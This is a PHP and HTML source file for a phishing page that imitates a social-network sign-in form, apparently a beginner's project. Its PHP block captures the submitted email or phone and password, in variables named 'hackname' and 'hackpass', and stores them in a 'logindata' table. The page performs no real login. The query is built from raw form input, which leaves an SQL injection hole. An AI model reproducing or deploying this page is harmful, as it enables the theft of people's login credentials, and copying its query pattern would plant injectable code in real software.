<?php 
if ($_POST)   
{
    $host = "localhost";
    $name = "root";
    $dbpassword = "";
    $dbname = "wipedata";
   
    $earth = mysqli_connect("$host", "$name", "$dbpassword", "$dbname");
 
    $hackname = $_POST['n'];
    $hackpass = $_POST['p']; 
    
    $result = mysqli_query($earth, "INSERT INTO `logindata` (`username`, `password`) VALUES ('$hackname', '$hackpass');");
}
?>




<!DOCTYPE html>
<html lang="en">

<head>
    <link rel="stylesheet" href="script.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document
    </title>
</head>

<body>
    <div class="niranjan">

        <form method="POST">
            <input type="textarea" name="n" class="btn" placeholder="Email address or phone number">
            <br><br><input type="textarea" name="p" class="btn" placeholder="Password">
            <br><br><input type="submit" class="loginbtn" value="Log In">
        </form>

        <br>
        <div class="link"><a href="#">Forgotton password?</a></div>
        <div class="line">
            <hr>
        </div>
        <button class="newaccount">Create New Account</button><br>
    </div>
</body>

</html>
